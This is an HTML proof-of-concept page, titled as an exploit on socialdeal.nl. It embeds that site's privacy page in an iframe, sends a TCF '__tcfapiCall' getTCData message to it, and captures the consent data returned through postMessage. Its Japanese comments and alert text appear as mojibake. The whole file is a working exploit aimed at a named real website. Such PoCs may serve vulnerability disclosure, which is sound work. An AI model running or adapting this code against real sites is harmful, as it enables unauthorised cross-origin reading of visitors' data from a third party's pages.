<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>__tcfapiCall PoC</title>
</head>
<body>
  <h1>PoC: __tcfapiCall Exploit on socialdeal.nl</h1>
  <iframe
    id="targetFrame"
    src="https://www.socialdeal.nl/privacy/"
    style="width:100%; height:300px; border:1px solid #ccc;"
  ></iframe>

  <script>
    const targetFrame = document.getElementById("targetFrame");
    const callId = "exploit-" + Date.now();

    // å¿œç­”å—ä¿¡
    window.addEventListener("message", (event) => {
      try {
        const data = typeof event.data === "string" ? JSON.parse(event.data) : event.data;
        if (data.__tcfapiReturn && data.__tcfapiReturn.callId === callId) {
          console.log("âœ… __tcfapiReturn received:", data.__tcfapiReturn);
          alert("âœ… æˆåŠŸï¼ãƒ‡ãƒ¼ã‚¿:\n" + JSON.stringify(data.__tcfapiReturn, null, 2));
        } else {
          console.log("ðŸ‘€ message received but not matching __tcfapiReturn:", data);
        }
      } catch (e) {
        console.warn("âš ï¸ Not JSON or invalid data:", event.data);
      }
    });

    // iframeå®Œå…¨ãƒ­ãƒ¼ãƒ‰å¾Œã«é€ä¿¡
    targetFrame.onload = () => {
      console.log("[PoC] iframe loaded, waiting 5s before sending...");

      setTimeout(() => {
        const payload = {
          __tcfapiCall: {
            command: "getTCData",
            version: 2,
            parameter: null,
            callId: callId
          }
        };

        targetFrame.contentWindow.postMessage(JSON.stringify(payload), "https://www.socialdeal.nl");
        console.log("[PoC] __tcfapiCall sent:", payload);
      }, 5000); // iframeãƒ­ãƒ¼ãƒ‰å¾Œ5ç§’å¾…æ©Ÿ
    };
  </script>
</body>
</html>
